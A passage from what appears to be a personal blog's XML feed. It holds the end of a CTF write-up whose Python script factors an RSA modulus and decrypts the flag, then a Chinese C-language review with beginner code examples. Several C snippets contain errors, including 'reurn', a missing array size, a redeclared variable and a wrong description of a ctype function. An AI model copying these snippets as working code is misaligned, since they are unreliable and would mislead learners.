data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>r <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">iroot</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span><span class="token function">mpz</span><span class="token punctuation">(</span>n<span class="token comment">//(p*q**2)),3)</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'p ='</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'q ='</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'r ='</span><span class="token punctuation">,</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>q<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">**</span><span class="token number">3</span><span class="token operator">-</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">long_to_bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>N0w_U_knOw_how_70_u5E_W1lS0n'5_Th30r3m<span class="token operator">~</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpYWhpYWNoYW5nL2FydGljbGUvZGV0YWlscy8xMDg4MDAyMTA=">大佬 1 的 WP</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5lL2FydGljbGUvZGV0YWlscy8xMDg4MzMzNzM=">大佬 2 的 WP</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言复习总结</title>
    <url>/article/7625eb58.html</url>
    <content><![CDATA[<p>系统性的复习一下 C，毕竟万物始于 C 嘛！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111192714626.png" alt="image-20220111192714626" /></p>
<h2 id="c语言简介"><a class="anchor" href="#c语言简介">#</a> C 语言简介</h2>
<p>高效性、可移植性、强大的功能与灵活性</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111192844644.png" alt="image-20220111192844644" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  <span class="token comment">// 标准的输入输出文件</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 主函数 main</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 为定义名为 num 的变量赋值</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"i am 21r000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 使用 printf 函数打印</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    reurn <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 返回值</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>C 语言错误一般分为：</p>
<ul>
<li>语法错误</li>
<li>语义错误</li>
</ul>
<h2 id="数据与c"><a class="anchor" href="#数据与c">#</a> 数据与 C</h2>
<h3 id="整数型"><a class="anchor" href="#整数型">#</a> 整数型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">int</span> num<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// 类型名 变量名</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> num1<span class="token punctuation">,</span>num2<span class="token punctuation">,</span>num3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 类型名 变量名 变量名 变量名</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 赋值</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">//scanf 输入函数 scanf ("% d",&amp;num);</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">//scanf_s 输入函数 scanf_s ("% d",&amp;num,10); 需声名大小</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">//% d 相当于告诉程序，接收的参数是一个 int 类型</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">//&amp;num 告诉程序，接收的数据，储存到 num 里面</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// \n 换行</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">//int 类型占 32 位</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">//short int 16 位 short 不长于 int 类型</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//long int 32 位 long 不短于 int 类型</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">//long long int 64 位</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">//unsiged 无符号 int 类型</span></pre></td></tr></table></figure><h3 id="字符型"><a class="anchor" href="#字符型">#</a> 字符型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 理论上占 8 位</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//Ascii 码 0-127</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//Unicode</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//16 位甚至 32 位</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> name <span class="token operator">=</span> <span class="token char">'A'</span><span class="token punctuation">;</span><span class="token comment">// 定义变量</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">//scanf ("% C",&amp;name); 读入字符</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span>；</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// \n 换行</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// \r 回车</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// \a 警报</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111194834591.png" alt="image-20220111194834591" /></p>
<h3 id="浮点型"><a class="anchor" href="#浮点型">#</a> 浮点型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">//float 单精度浮点型 32 位</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//double 双精度浮点型 64 位</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">// 其实浮点寄存器是不能精确存储的</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">float</span> num <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">double</span> num1 <span class="token operator">=</span> <span class="token number">12E-5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f,%f"</span><span class="token punctuation">,</span>num<span class="token punctuation">,</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111195337335.png" alt="image-20220111195337335" /></p>
<h3 id="_bool类型"><a class="anchor" href="#_bool类型">#</a> _Bool 类型</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">_Bool</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//0 代表 false</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//1 代表 true</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符串的格式化输入输出"><a class="anchor" href="#字符串的格式化输入输出">#</a> 字符串的格式化输入输出</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PI</span> <span class="token expression"><span class="token number">3.14</span></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//define 给 PI 赋值</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 字符串变量不需要在作为 scanf 参数的时候加 & amp; 符号</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">//sizeof 返回的是数组实际占用的内存数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">//strlen 计算字符的有效字符数，遇到 NULL 结束，NULL = 00</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111200451835.png" alt="image-20220111200451835" /></p>
<h2 id="运算符-表达式和语句"><a class="anchor" href="#运算符-表达式和语句">#</a> 运算符、表达式和语句</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">//1. 顺序结构</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//2. 循环结构</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">// 选择结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Right!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No！"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>C 语言的除法运算中，如果是整形，就会被截尾；如果是浮点型，就会保留小数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 求模运算符 %</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//10 - 3 * 3 求的是余数</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220111201625377.png" alt="image-20220111201625377" /></p>
<h2 id="流程控制语句-循环"><a class="anchor" href="#流程控制语句-循环">#</a> 流程控制语句 - 循环</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//while</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//true = 1</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">//false = 0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">// 死循环，没有推出条件</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        flag <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">//do while 循环无论如何都会进入代码块执行一次</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">do</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>flag <span class="token operator">>=</span> <span class="token number">11</span><span class="token comment">/* condition */</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//1. 首先执行代码块</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">//2. 进行表达式判断</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">//3. 如果表达式返回值是 1，那么进入代码块继续执行，否则退出</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">//for 循环</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag <span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token comment">//1. 循环计数器赋初值</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">//2. 判断是否符合表达式</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">//3. 执行代码块</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment">//4. 自增，判断是否符合表达式</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment">//5. 执行代码块</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="流程控制语句-分支和跳转"><a class="anchor" href="#流程控制语句-分支和跳转">#</a> 流程控制语句 - 分支和跳转</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span><span class="token comment">// 字符判断函数</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//if</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> num<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag = num"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">else</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"flag != num"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">char</span> a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    a <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 读取一个字符</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">isalpha</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断参数是否为字符</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">putchar</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出一个字符</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//isalpha 判断参数是否为字符</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">//isalnum 判断参数是否为字母或数字</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">//isblank 判断参数是否为空白字符</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">//iscntrl 判断参数是否为控制符</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">//isdigit 判断参数是否为十进制数字字符</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">//isgraph 判断参数是否为可打印字符</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">//isprint 判断参数是否为可打印字符（含空格）</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">//isounct 判断参数是否为小写字符</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token comment">//isspace 判断参数是否为空白字符</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">//&amp;&amp; || !</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">//and or not</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment">//!(4>7) 取反运算符</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment">//?: 判断运算符</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token comment">//contuine 跳出本次循环，执行下一次循环</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">//break 跳出大循环，直接到后面执行</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token comment">//switch</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>flag <span class="token comment">/*expression*/</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token comment">/* constant-expression */</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">break</span><span class="token 